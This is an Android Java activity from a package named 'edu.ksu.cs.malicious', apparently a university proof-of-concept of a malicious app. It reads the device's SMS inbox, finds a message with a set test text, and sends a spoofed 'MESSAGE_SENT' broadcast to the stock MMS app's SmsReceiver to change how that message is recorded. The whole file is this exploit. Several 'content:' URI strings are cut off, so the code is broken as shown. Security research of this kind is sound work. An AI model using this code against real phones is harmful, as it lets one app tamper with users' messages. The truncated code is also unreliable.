package edu.ksu.cs.malicious;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume(){
        super.onResume();


        int flag = 0;
        Cursor cursor = getContentResolver().query(Uri.parse("content:

        if (cursor.moveToFirst()) { 
            do {
                String body = cursor.getString(cursor.getColumnIndex("body"));
                if(body.equals("another test sms1!")){
                    flag = 1;
                    Log.d(TAG, body);
                    Log.d(TAG, "id = " + cursor.getString(cursor.getColumnIndex("_ID")));
                    Log.d(TAG, "id = " + Uri.parse("content:
                    Intent intent= new Intent("com.android.mms.transaction.MESSAGE_SENT");
                    intent.setData(Uri.parse("content:
                    intent.setClassName("com.android.mms", "com.android.mms.transaction.SmsReceiver");
                    sendOrderedBroadcast(intent,null,null,null, SmsManager.RESULT_ERROR_RADIO_OFF,null,null);
                }
                else Log.d(TAG,"body not found");
                
            } while (cursor.moveToNext());
        } else {
            Toast.makeText(getApplicationContext(),"Empty box",Toast.LENGTH_SHORT).show();
        }

    }
}
